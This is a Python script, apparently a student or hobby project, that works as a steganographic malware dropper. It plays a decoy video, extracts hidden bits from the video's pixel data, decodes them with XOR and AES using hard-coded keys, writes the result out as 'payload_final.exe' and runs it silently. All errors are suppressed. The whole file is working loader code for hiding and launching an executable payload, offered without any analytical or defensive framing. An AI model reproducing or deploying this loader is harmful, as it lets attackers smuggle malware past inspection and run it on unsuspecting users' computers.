import cv2
import numpy as np
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import os
import subprocess

# --- CẤU HÌNH ---
KEY = b'TruongGiang_2026' 
STEGO_KEY = 0x5A           
VIDEO_INPUT = 'Video_Malware.avi' 
TEMP_PAYLOAD = 'payload_final.exe'

def extract_bits():
    cap = cv2.VideoCapture(VIDEO_INPUT)
    bits = ""
    found_eof = False
    EOF_MARKER = '1111111111111110'

    while cap.isOpened():
        ret, frame = cap.read()
        if not ret or found_eof: break
        for i in range(frame.shape[0]):
            for j in range(frame.shape[1]):
                for k in range(3):
                    bits += str(frame[i, j, k] & 1)
                    if len(bits) >= 16 and bits[-16:] == EOF_MARKER:
                        bits = bits[:-16]
                        found_eof = True
                        break
                if found_eof: break
            if found_eof: break
    cap.release()
    return bits

def decrypt_and_run(bits):
    byte_data = bytearray()
    for i in range(0, len(bits), 8):
        byte = int(bits[i:i+8], 2)
        byte_data.append(byte)
    
    decrypted_xor = bytearray([b ^ STEGO_KEY for b in byte_data])
    try:
        iv = b'0123456789101112'
        cipher = AES.new(KEY, AES.MODE_CBC, iv=iv)
        final_payload = unpad(cipher.decrypt(decrypted_xor), AES.block_size)
        with open(TEMP_PAYLOAD, 'wb') as f:
            f.write(final_payload)
        subprocess.Popen(TEMP_PAYLOAD, shell=True)
    except:
        pass

if __name__ == "__main__":
    try:
        os.startfile(VIDEO_INPUT)
    except:
        pass
    
    extracted_bits = extract_bits()
    if extracted_bits:
        decrypt_and_run(extracted_bits)